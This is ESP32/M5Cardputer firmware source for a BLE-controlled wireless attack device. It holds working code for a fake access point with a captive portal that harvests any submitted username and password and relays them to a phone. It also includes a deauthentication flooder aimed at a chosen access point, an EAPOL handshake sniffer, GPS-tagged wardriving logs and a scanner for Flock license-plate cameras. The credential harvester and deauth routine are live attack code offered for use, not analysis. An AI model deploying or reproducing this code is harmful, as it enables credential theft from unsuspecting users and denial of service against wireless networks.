#include <M5Cardputer.h>
#include <BLEDevice.h>
#include <BLEServer.h>
#include <BLEUtils.h>
#include <BLE2902.h>
#include <SD.h>
#include <SPI.h>
#include <WiFi.h>
#include <WebServer.h>
#include <DNSServer.h>
#include <TinyGPSPlus.h>
#include "esp_wifi.h"

// --- UUID Architecture ---
#define SERVICE_UUID        "4fafc201-1fb5-459e-8fcc-c5c9c331914b"
#define CHARACTERISTIC_UUID "beb5483e-36e1-4688-b7f5-ea07361b26a6"

// --- Cardputer SD SPI Pins ---
#define SD_SPI_SCK_PIN  40
#define SD_SPI_MISO_PIN 39
#define SD_SPI_MOSI_PIN 14
#define SD_SPI_CS_PIN   12

// --- Cap LoRa-1262 GPS UART Pins ---
#define GPS_RX_PIN 15
#define GPS_TX_PIN 13

TinyGPSPlus gps;
HardwareSerial gpsSerial(1);

DNSServer dnsServer;
WebServer server(80);

volatile bool clientConnectedFlag = false;
volatile bool clientDisconnectedFlag = false;
volatile bool dataReceivedFlag = false;

String incomingCommandBuffer = "";
String selectedPortalFile = "/index.html";
BLECharacteristic *pGlobalCharacteristic = nullptr;

// Operational States
enum SystemMode { MODE_IDLE, MODE_PORTAL, MODE_WARDRIVE, MODE_RECON, MODE_DEAUTH, MODE_FLOCK, MODE_EAPOL };
SystemMode currentSystemMode = MODE_IDLE;

bool wardrivingActive = false;
bool flockActive = false;
bool deauthActive = false;
bool eapolActive = false;
String targetDeauthBssid = "";
int targetDeauthChannel = 1;
String targetEapolBssid = "";
String targetEapolSsid = "";
int targetEapolChannel = 1;
unsigned long lastDeauthPacket = 0;

double currentLat = 0.0;
double currentLon = 0.0;
double currentAlt = 0.0;
bool hasGpsLock = false;
unsigned long lastWardriveScan = 0;
unsigned long lastFlockScan = 0;
int totalWigleRecords = 0;
int totalFlockDetections = 0;
int totalEapolHits = 0;
int capturedCredsCount = 0;

String currentWigleFile = "";
String currentFlockFile = "";
String currentEapolFile = "";

const String flockOuis[] = {"54:11:5F", "70:3A:0E", "E0:75:32", "00:18:0A", "24:0A:C4"};

class MyServerCallbacks: public BLEServerCallbacks {
    void onConnected(BLEServer* pServer) { clientConnectedFlag = true; }
    void onDisconnected(BLEServer* pServer) { clientDisconnectedFlag = true; }
};

class MyCallbacks: public BLECharacteristicCallbacks {
    void onWrite(BLECharacteristic *pCharacteristic) {
        String value = pCharacteristic->getValue();
        if (value.length() > 0) {
            incomingCommandBuffer = value;
            dataReceivedFlag = true;
            Serial.print("[BLE RX]: ");
            Serial.println(value);
        }
    }
};

void updateCardputerScreen() {
    M5Cardputer.Display.fillScreen(BLACK);
    M5Cardputer.Display.setCursor(0, 0);
    
    M5Cardputer.Display.setTextColor(CYAN);
    M5Cardputer.Display.println("=== CARDPUTER COMMAND ===");
    
    M5Cardputer.Display.setTextColor(clientConnectedFlag ? GREEN : YELLOW);
    M5Cardputer.Display.print("BLE: ");
    M5Cardputer.Display.println(clientConnectedFlag ? "CONNECTED (iOS)" : "ADVERTISING");

    M5Cardputer.Display.setTextColor(WHITE);
    M5Cardputer.Display.print("MODE: ");
    if (currentSystemMode == MODE_PORTAL) {
        M5Cardputer.Display.setTextColor(RED);
        M5Cardputer.Display.println("[PORTAL ACTIVE]");
    } else if (currentSystemMode == MODE_FLOCK) {
        M5Cardputer.Display.setTextColor(MAGENTA);
        M5Cardputer.Display.println("[FLOCK SCAN ACTIVE]");
    } else if (currentSystemMode == MODE_WARDRIVE) {
        M5Cardputer.Display.setTextColor(GREEN);
        M5Cardputer.Display.println("[WARDRIVING ACTIVE]");
    } else if (currentSystemMode == MODE_DEAUTH) {
        M5Cardputer.Display.setTextColor(RED);
        M5Cardputer.Display.println("[DEAUTH ACTIVE]");
    } else if (currentSystemMode == MODE_EAPOL) {
        M5Cardputer.Display.setTextColor(ORANGE);
        M5Cardputer.Display.println("[EAPOL SNIFF ACTIVE]");
    } else if (currentSystemMode == MODE_RECON) {
        M5Cardputer.Display.setTextColor(YELLOW);
        M5Cardputer.Display.println("[RECON SWEEPING]");
    } else {
        M5Cardputer.Display.setTextColor(GREEN);
        M5Cardputer.Display.println("IDLE / STANDBY");
    }

    M5Cardputer.Display.setTextColor(hasGpsLock ? GREEN : YELLOW);
    M5Cardputer.Display.print("GPS: ");
    if (hasGpsLock) {
        M5Cardputer.Display.println("LOCKED (Sats: " + String(gps.satellites.value()) + ")");
        M5Cardputer.Display.setTextColor(WHITE);
        M5Cardputer.Display.println("Lat: " + String(currentLat, 5));
        M5Cardputer.Display.println("Lon: " + String(currentLon, 5));
    } else {
        M5Cardputer.Display.println("Searching... (Sats: " + String(gps.satellites.value()) + ")");
        M5Cardputer.Display.println("Position: No Fix");
    }

    M5Cardputer.Display.setTextColor(MAGENTA);
    M5Cardputer.Display.print("Flock Hits: ");
    M5Cardputer.Display.println(totalFlockDetections);
    M5Cardputer.Display.setTextColor(CYAN);
    M5Cardputer.Display.print("Creds: ");
    M5Cardputer.Display.println(capturedCredsCount);
}

bool isFlockMac(String mac) {
    mac.toUpperCase();
    for (String oui : flockOuis) {
        if (mac.startsWith(oui)) return true;
    }
    return false;
}

void setupStorageDirectories() {
    if (!SD.exists("/WardriveRemote")) SD.mkdir("/WardriveRemote");
    if (!SD.exists("/Flock Scan")) SD.mkdir("/Flock Scan");
    if (!SD.exists("/EAPOL")) SD.mkdir("/EAPOL");
}

void initWigleCsv() {
    int fileIndex = 1;
    while (true) {
        String candidate = "/WardriveRemote/wigle_" + String(fileIndex) + ".csv";
        if (!SD.exists(candidate.c_str())) { currentWigleFile = candidate; break; }
        fileIndex++;
    }
    File file = SD.open(currentWigleFile.c_str(), FILE_WRITE);
    if (file) {
        file.println("WigleWifi-1.6,appRelease=Cardputer-Adv,model=Cardputer,release=1.0,device=ESP32S3");
        file.println("MAC,SSID,AuthMode,FirstSeen,Channel,Frequency,RSSI,CurrentLatitude,CurrentLongitude,AltitudeMeters,AccuracyMeters,RCOIs,MfgrId,Type");
        file.close();
    }
}

void initDeflockCsv() {
    int fileIndex = 1;
    while (true) {
        String candidate = "/Flock Scan/deflock_" + String(fileIndex) + ".csv";
        if (!SD.exists(candidate.c_str())) { currentFlockFile = candidate; break; }
        fileIndex++;
    }
    File file = SD.open(currentFlockFile.c_str(), FILE_WRITE);
    if (file) {
        file.println("DeviceType,MAC,SSID,RSSI,Latitude,Longitude,Altitude,Timestamp,Operator");
        file.close();
    }
}

void logToWigleCsv(String mac, String ssid, String auth, String channel, String freq, String rssi, String type) {
    if (currentWigleFile.length() == 0) initWigleCsv();
    File file = SD.open(currentWigleFile.c_str(), FILE_APPEND);
    if (file) {
        String timestamp = "2026-08-17 00:00:00";
        String latStr = hasGpsLock ? String(currentLat, 6) : "";
        String lonStr = hasGpsLock ? String(currentLon, 6) : "";
        String altStr = hasGpsLock ? String(currentAlt, 1) : "";
        ssid.replace(",", "");
        
        String row = mac + "," + ssid + "," + auth + "," + timestamp + "," + channel + "," + freq + "," + rssi + "," + latStr + "," + lonStr + "," + altStr + ",, ,," + type;
        file.println(row);
        file.close();
        totalWigleRecords++;
    }
}

void logToDeflockCsv(String type, String mac, String ssid, String rssi) {
    if (currentFlockFile.length() == 0) initDeflockCsv();
    File file = SD.open(currentFlockFile.c_str(), FILE_APPEND);
    if (file) {
        String latStr = hasGpsLock ? String(currentLat, 6) : "0.0";
        String lonStr = hasGpsLock ? String(currentLon, 6) : "0.0";
        String altStr = hasGpsLock ? String(currentAlt, 1) : "0.0";
        ssid.replace(",", "");
        
        String row = type + "," + mac + "," + ssid + "," + rssi + "," + latStr + "," + lonStr + "," + altStr + ",2026-08-17 00:00:00,FlockSafety";
        file.println(row);
        file.close();
        totalFlockDetections++;

        if (pGlobalCharacteristic != nullptr) {
            String payload = "FLOCK_HIT:" + type + "|" + mac + "|" + ssid + "|" + rssi + "|" + latStr + "|" + lonStr;
            pGlobalCharacteristic->setValue(payload.c_str());
            pGlobalCharacteristic->notify();
        }
    }
}

void performWardriveScan() {
    int n = WiFi.scanNetworks(false, true);
    for (int i = 0; i < n; ++i) {
        String ssid = WiFi.SSID(i);
        String bssid = WiFi.BSSIDstr(i);
        int channel = WiFi.channel(i);
        int rssi = WiFi.RSSI(i);
        wifi_auth_mode_t enc = WiFi.encryptionType(i);
        String authMode = (enc == WIFI_AUTH_OPEN) ? "[OPEN]" : "[WPA2-PSK-CCMP]";
        int freq = 2407 + (channel * 5);
        logToWigleCsv(bssid, ssid, authMode, String(channel), String(freq), String(rssi), "WIFI");
    }
    WiFi.scanDelete();

    BLEScan* pBLEScan = BLEDevice::getScan();
    BLEScanResults* foundDevices = pBLEScan->start(2, false);
    if (foundDevices != nullptr) {
        for (int i = 0; i < foundDevices->getCount(); i++) {
            BLEAdvertisedDevice device = foundDevices->getDevice(i);
            String bleMac = device.getAddress().toString().c_str();
            bleMac.toUpperCase();
            String bleName = device.haveName() ? device.getName().c_str() : "BLE-Device";
            int rssi = device.getRSSI();
            logToWigleCsv(bleMac, bleName, "[LE]", "0", "0", String(rssi), "BLE");
        }
    }
    pBLEScan->clearResults();

    if (pGlobalCharacteristic != nullptr) {
        String stat = "WARDRIVE_STAT:" + String(totalWigleRecords) + "|" + String(currentLat, 6) + "|" + String(currentLon, 6) + "|" + (hasGpsLock ? "1" : "0");
        pGlobalCharacteristic->setValue(stat.c_str());
        pGlobalCharacteristic->notify();
    }
}

void performFlockScan() {
    int n = WiFi.scanNetworks(false, true);
    for (int i = 0; i < n; ++i) {
        String ssid = WiFi.SSID(i);
        String bssid = WiFi.BSSIDstr(i);
        int rssi = WiFi.RSSI(i);
        if (isFlockMac(bssid)) {
            logToDeflockCsv("Flock_WiFi", bssid, ssid, String(rssi));
        }
    }
    WiFi.scanDelete();

    BLEScan* pBLEScan = BLEDevice::getScan();
    BLEScanResults* foundDevices = pBLEScan->start(2, false);
    if (foundDevices != nullptr) {
        for (int i = 0; i < foundDevices->getCount(); i++) {
            BLEAdvertisedDevice device = foundDevices->getDevice(i);
            String bleMac = device.getAddress().toString().c_str();
            bleMac.toUpperCase();
            String bleName = device.haveName() ? device.getName().c_str() : "ALPR-BLE";
            int rssi = device.getRSSI();
            if (isFlockMac(bleMac)) {
                logToDeflockCsv("Flock_BLE", bleMac, bleName, String(rssi));
            }
        }
    }
    pBLEScan->clearResults();
}

void initEapolFile(String ssid) {
    ssid.replace("/", "_");
    ssid.replace(" ", "_");
    if (ssid.length() == 0) ssid = "Hidden_Network";

    int fileIndex = 1;
    while (true) {
        String candidate = "/EAPOL/" + ssid + "_" + String(fileIndex) + ".csv";
        if (!SD.exists(candidate.c_str())) { currentEapolFile = candidate; break; }
        fileIndex++;
    }

    File file = SD.open(currentEapolFile.c_str(), FILE_WRITE);
    if (file) {
        file.println("Timestamp,BSSID,StationMAC,Channel,HandshakeCaptured");
        file.close();
    }
}

void logToEapolCsv(String bssid, String staMac, String channel) {
    File file = SD.open(currentEapolFile.c_str(), FILE_APPEND);
    if (file) {
        String row = "2026-08-17 00:00:00," + bssid + "," + staMac + "," + channel + ",EAPOL_KEY_FRAME";
        file.println(row);
        file.close();
        totalEapolHits++;

        if (pGlobalCharacteristic != nullptr) {
            String payload = "EAPOL_HIT:" + bssid + "|" + staMac + "|" + channel;
            pGlobalCharacteristic->setValue(payload.c_str());
            pGlobalCharacteristic->notify();
        }
    }
}

void wifiPromiscuousRxCb(void* buf, wifi_promiscuous_pkt_type_t type) {
    if (!eapolActive) return;
    wifi_promiscuous_pkt_t *pkt = (wifi_promiscuous_pkt_t*)buf;
    if (type == WIFI_PKT_DATA || type == WIFI_PKT_MGMT) {
        uint8_t *payload = pkt->payload;
        int len = pkt->rx_ctrl.sig_len;
        
        for (int i = 0; i < len - 8; i++) {
            if (payload[i] == 0x88 && payload[i+1] == 0x8E) {
                logToEapolCsv(targetEapolBssid, "Client_Station", String(targetEapolChannel));
                break;
            }
        }
    }
}

void parseMac(String macStr, uint8_t* macBytes) {
    int index = 0;
    for (int i = 0; i < 6; i++) {
        macBytes[i] = strtol(macStr.substring(index, index + 2).c_str(), NULL, 16);
        index += 3;
    }
}

void sendDeauthFrame(String bssidStr, int channel) {
    WiFi.setChannel(channel);
    uint8_t apMac[6];
    parseMac(bssidStr, apMac);

    uint8_t packet[26] = {
        0xc0, 0x00, 0x3a, 0x01,
        0xff, 0xff, 0xff, 0xff, 0xff, 0xff,
        apMac[0], apMac[1], apMac[2], apMac[3], apMac[4], apMac[5],
        apMac[0], apMac[1], apMac[2], apMac[3], apMac[4], apMac[5],
        0x70, 0x00,
        0x07, 0x00
    };
    esp_wifi_80211_tx(WIFI_IF_AP, packet, sizeof(packet), false);
}

void listDirectoryToBLE(BLECharacteristic *pChar) {
    File root = SD.open("/");
    if (!root) {
        if (pChar != nullptr) { pChar->setValue("SD_DONE"); pChar->notify(); }
        return;
    }
    
    root.rewindDirectory();
    File file = root.openNextFile();
    while (file) {
        String fileName = String(file.name());
        if (file.isDirectory()) {
            File subRoot = SD.open(file.name());
            if (subRoot) {
                File subFile = subRoot.openNextFile();
                while (subFile) {
                    if (!subFile.isDirectory()) {
                        String subName = String(subFile.name());
                        if (subName.startsWith("/")) subName = subName.substring(1);
                        String payload = "SD_FILE:" + subName;
                        if (pChar != nullptr) {
                            pChar->setValue(payload.c_str());
                            pChar->notify();
                        }
                        delay(40);
                    }
                    subFile.close();
                    subFile = subRoot.openNextFile();
                }
                subRoot.close();
            }
        } else {
            if (fileName.startsWith("/")) fileName = fileName.substring(1);
            String payload = "SD_FILE:" + fileName;
            if (pChar != nullptr) {
                pChar->setValue(payload.c_str());
                pChar->notify();
            }
            delay(40);
        }
        file.close();
        file = root.openNextFile();
    }
    root.close();

    if (pChar != nullptr) {
        delay(50);
        pChar->setValue("SD_DONE");
        pChar->notify();
    }
}

void handleUniversalHarvest() {
    if (server.args() > 0 || server.arg("plain").length() > 0) {
        String user = "";
        String pass = "";

        String userKeys[] = {"email", "username", "user", "identity", "login", "id", "account"};
        for (String key : userKeys) {
            if (server.hasArg(key)) { user = server.arg(key); break; }
        }
        if (user.length() == 0 && server.args() > 0) user = server.arg(0);

        String passKeys[] = {"password", "pass", "pwd", "passwd", "key", "secret"};
        for (String key : passKeys) {
            if (server.hasArg(key)) { pass = server.arg(key); break; }
        }
        if (pass.length() == 0 && server.args() > 1) pass = server.arg(1);

        String rawBody = server.arg("plain");
        if (user.length() == 0 && rawBody.length() > 0) {
            user = "RawBodyData";
            pass = rawBody;
        }

        if (user.length() > 0 || pass.length() > 0) {
            if (user.length() == 0) user = "Unknown_User";
            if (pass.length() == 0) pass = "Unknown_Pass";

            capturedCredsCount++;
            M5Cardputer.Display.fillScreen(BLACK);
            M5Cardputer.Display.setCursor(0, 0);
            M5Cardputer.Display.setTextColor(RED);
            M5Cardputer.Display.println("[!] TARGET COMPROMISED!");
            M5Cardputer.Display.setTextColor(GREEN);
            M5Cardputer.Display.println("ID: " + user);
            M5Cardputer.Display.println("PW: " + pass);

            if (pGlobalCharacteristic != nullptr) {
                String credPayload = "CRED_LOG:" + user + "|" + pass + "|Just Now";
                pGlobalCharacteristic->setValue(credPayload.c_str());
                pGlobalCharacteristic->notify();
            }

            server.send(200, "text/html", "<html><body style='background:#050a05;color:#00ff48;font-family:monospace;text-align:center;padding-top:40px;'><h1>AUTHENTICATION ACCEPTED</h1><p>Access granted. You may now close this window.</p></body></html>");
            return;
        }
    }

    server.sendHeader("Location", "http://"+WiFi.softAPIP().toString()+"/", true); 
    server.send(302, "text/plain", "");
}

void setupCaptivePortal(String ssid, String password, String portalFile) {
    WiFi.mode(WIFI_AP);
    if (password.length() > 0) WiFi.softAP(ssid.c_str(), password.c_str());
    else WiFi.softAP(ssid.c_str());
    
    delay(500);
    dnsServer.start(53, "*", WiFi.softAPIP());

    server.on("/", HTTP_GET, [portalFile]() {
        String path = portalFile.startsWith("/") ? portalFile : "/" + portalFile;
        if (SD.exists(path.c_str())) {
            File file = SD.open(path.c_str(), FILE_READ);
            server.streamFile(file, "text/html");
            file.close();
        } else {
            server.send(404, "text/plain", "Portal payload missing on SD: " + path);
        }
    });

    server.onNotFound(handleUniversalHarvest);
    server.begin();
}

void setup() {
    Serial.begin(115200);
    delay(1000);

    auto cfg = M5.config();
    M5Cardputer.begin(cfg, true);

    M5Cardputer.Display.setRotation(1);
    M5Cardputer.Display.setTextColor(GREEN);
    M5Cardputer.Display.setTextSize(1);
    M5Cardputer.Display.fillScreen(BLACK);

    // Clean SPI & SD initialization with robust retry loop
    SPI.begin(SD_SPI_SCK_PIN, SD_SPI_MISO_PIN, SD_SPI_MOSI_PIN, SD_SPI_CS_PIN);

    bool sdMounted = false;
    for (int attempt = 1; attempt <= 8; attempt++) {
        Serial.println("[SD] Mount attempt " + String(attempt) + "...");
        if (SD.begin(SD_SPI_CS_PIN, SPI, 25000000)) {
            Serial.println("[SD] Mounted successfully on attempt " + String(attempt));
            sdMounted = true;
            break;
        }
        delay(500);
    }

    if (sdMounted) {
        M5Cardputer.Display.println("[+] SD Card Mounted.");
        Serial.println("[SD] SD Card Mounted Successfully.");
        setupStorageDirectories(); // Only sets up folder structure, no empty log files created on boot!
    } else {
        M5Cardputer.Display.println("[!] SD Card Mount Error!");
        Serial.println("[SD ERROR] SD Card Mount Failed.");
    }

    gpsSerial.begin(115200, SERIAL_8N1, GPS_RX_PIN, GPS_TX_PIN);

    BLEDevice::init("Cardputer-Advanced-BLE");
    BLEServer *pServer = BLEDevice::createServer();
    pServer->setCallbacks(new MyServerCallbacks());
    
    BLEService *pService = pServer->createService(SERVICE_UUID);
    BLECharacteristic *pCharacteristic = pService->createCharacteristic(
        CHARACTERISTIC_UUID,
        BLECharacteristic::PROPERTY_READ | BLECharacteristic::PROPERTY_WRITE | BLECharacteristic::PROPERTY_NOTIFY
    );
                                        
    pCharacteristic->setCallbacks(new MyCallbacks());
    pCharacteristic->addDescriptor(new BLE2902());
    pGlobalCharacteristic = pCharacteristic;
    
    pService->start();
    BLEAdvertising *pAdvertising = BLEDevice::getAdvertising();
    pAdvertising->addServiceUUID(SERVICE_UUID);
    pAdvertising->setScanResponse(true);
    BLEDevice::startAdvertising();
    
    updateCardputerScreen();
}

void loop() {
    M5Cardputer.update();

    if (currentSystemMode == MODE_PORTAL) {
        dnsServer.processNextRequest();
        server.handleClient();
    }

    while (gpsSerial.available() > 0) {
        gps.encode(gpsSerial.read());
    }

    if (gps.location.isUpdated()) {
        currentLat = gps.location.lat();
        currentLon = gps.location.lng();
        currentAlt = gps.altitude.meters();
        hasGpsLock = gps.location.isValid();
    }

    if (clientConnectedFlag) {
        clientConnectedFlag = false;
        updateCardputerScreen();
    }

    if (clientDisconnectedFlag) {
        clientDisconnectedFlag = false;
        WiFi.softAPdisconnect(true);
        server.stop();
        dnsServer.stop();
        BLEDevice::startAdvertising();
        currentSystemMode = MODE_IDLE;
        updateCardputerScreen();
    }

    if (dataReceivedFlag) {
        dataReceivedFlag = false;
        String cmd = incomingCommandBuffer;
        incomingCommandBuffer = "";

        if (cmd.startsWith("LIST") || cmd.startsWith("LIST_SD")) {
            listDirectoryToBLE(pGlobalCharacteristic);
        } else if (cmd.startsWith("START_AP:")) {
            int c1 = cmd.indexOf(':');
            int c2 = cmd.indexOf(':', c1 + 1);
            int c3 = cmd.indexOf(':', c2 + 1);
            
            String apSsid = "";
            String apPass = "";
            String portalFile = "/index.html";

            if (c3 != -1) {
                apSsid = cmd.substring(c1 + 1, c2);
                apPass = cmd.substring(c2 + 1, c3);
                portalFile = cmd.substring(c3 + 1);
            } else if (c2 != -1) {
                apSsid = cmd.substring(c1 + 1, c2);
                apPass = cmd.substring(c2 + 1);
            } else if (c1 != -1) {
                apSsid = cmd.substring(c1 + 1);
            }

            selectedPortalFile = portalFile;
            setupCaptivePortal(apSsid, apPass, portalFile);
            currentSystemMode = MODE_PORTAL;
            
            if (pGlobalCharacteristic != nullptr) {
                pGlobalCharacteristic->setValue("PORTAL_STARTED");
                pGlobalCharacteristic->notify();
            }
        } else if (cmd == "STOP_AP") {
            WiFi.softAPdisconnect(true);
            server.stop();
            dnsServer.stop();
            currentSystemMode = MODE_IDLE;
            if (pGlobalCharacteristic != nullptr) {
                pGlobalCharacteristic->setValue("PORTAL_STOPPED");
                pGlobalCharacteristic->notify();
            }
        } else if (cmd.startsWith("START_EAPOL:")) {
            int c1 = cmd.indexOf(':');
            int c2 = cmd.indexOf(':', c1 + 1);
            int c3 = cmd.indexOf(':', c2 + 1);
            if (c1 != -1 && c2 != -1 && c3 != -1) {
                targetEapolBssid = cmd.substring(c1 + 1, c2);
                targetEapolChannel = cmd.substring(c2 + 1, c3).toInt();
                targetEapolSsid = cmd.substring(c3 + 1);
                
                initEapolFile(targetEapolSsid);
                eapolActive = true;
                currentSystemMode = MODE_EAPOL;
                WiFi.mode(WIFI_STA);
                WiFi.setChannel(targetEapolChannel);
                esp_wifi_set_promiscuous(true);
                esp_wifi_set_promiscuous_rx_cb(&wifiPromiscuousRxCb);
            }
        } else if (cmd == "STOP_EAPOL") {
            eapolActive = false;
            esp_wifi_set_promiscuous(false);
            currentSystemMode = MODE_IDLE;
        } else if (cmd.startsWith("RECON_SWEEP")) {
            currentSystemMode = MODE_RECON;
            updateCardputerScreen();
            WiFi.mode(WIFI_STA);
            WiFi.disconnect();
            delay(100);
            int n = WiFi.scanNetworks();
            if (pGlobalCharacteristic != nullptr) {
                pGlobalCharacteristic->setValue("RECON_START");
                pGlobalCharacteristic->notify();
            }
            for (int i = 0; i < n; ++i) {
                String netInfo = "RECON_NET:" + WiFi.SSID(i) + "|" + WiFi.BSSIDstr(i) + "|" + String(WiFi.RSSI(i)) + "|" + String(WiFi.channel(i)) + "|WPA2";
                if (pGlobalCharacteristic != nullptr) {
                    pGlobalCharacteristic->setValue(netInfo.c_str());
                    pGlobalCharacteristic->notify();
                }
                delay(40);
            }
            if (pGlobalCharacteristic != nullptr) {
                pGlobalCharacteristic->setValue("RECON_DONE");
                pGlobalCharacteristic->notify();
            }
            currentSystemMode = MODE_IDLE;
        } else if (cmd.startsWith("START_DEAUTH:")) {
            int c1 = cmd.indexOf(':');
            int c2 = cmd.indexOf(':', c1 + 1);
            if (c1 != -1 && c2 != -1) {
                targetDeauthBssid = cmd.substring(c1 + 1, c2);
                targetDeauthChannel = cmd.substring(c2 + 1).toInt();
                deauthActive = true;
                currentSystemMode = MODE_DEAUTH;
                WiFi.mode(WIFI_STA);
            }
        } else if (cmd == "STOP_DEAUTH") {
            deauthActive = false;
            currentSystemMode = MODE_IDLE;
        } else if (cmd == "START_FLOCK") {
            flockActive = true;
            currentSystemMode = MODE_FLOCK;
            if (currentFlockFile.length() == 0) initDeflockCsv();
        } else if (cmd == "STOP_FLOCK") {
            flockActive = false;
            currentSystemMode = MODE_IDLE;
        } else if (cmd == "START_WARDRIVE") {
            wardrivingActive = true;
            currentSystemMode = MODE_WARDRIVE;
            if (currentWigleFile.length() == 0) initWigleCsv();
        } else if (cmd == "STOP_WARDRIVE") {
            wardrivingActive = false;
            currentSystemMode = MODE_IDLE;
        }
        updateCardputerScreen();
    }

    if (deauthActive && millis() - lastDeauthPacket > 100) {
        lastDeauthPacket = millis();
        sendDeauthFrame(targetDeauthBssid, targetDeauthChannel);
    }

    if (wardrivingActive && millis() - lastWardriveScan > 5000) {
        lastWardriveScan = millis();
        performWardriveScan();
    }

    if (flockActive && millis() - lastFlockScan > 4000) {
        lastFlockScan = millis();
        performFlockScan();
    }

    static unsigned long lastDisplayRefresh = 0;
    if (millis() - lastDisplayRefresh > 3000) {
        lastDisplayRefresh = millis();
        updateCardputerScreen();
    }

    static unsigned long lastTelemetry = 0;
    if (millis() - lastTelemetry > 5000) {
        lastTelemetry = millis();
        float batteryVoltage = M5Cardputer.Power.getBatteryVoltage() / 1000.0;
        int batteryLevel = M5Cardputer.Power.getBatteryLevel();
        String telemetry = "TELEMETRY|BAT:" + String(batteryLevel) + "%|" + String(batteryVoltage) + "V";
        if (pGlobalCharacteristic != nullptr) {
            pGlobalCharacteristic->setValue(telemetry.c_str());
            pGlobalCharacteristic->notify();
        }
    }
}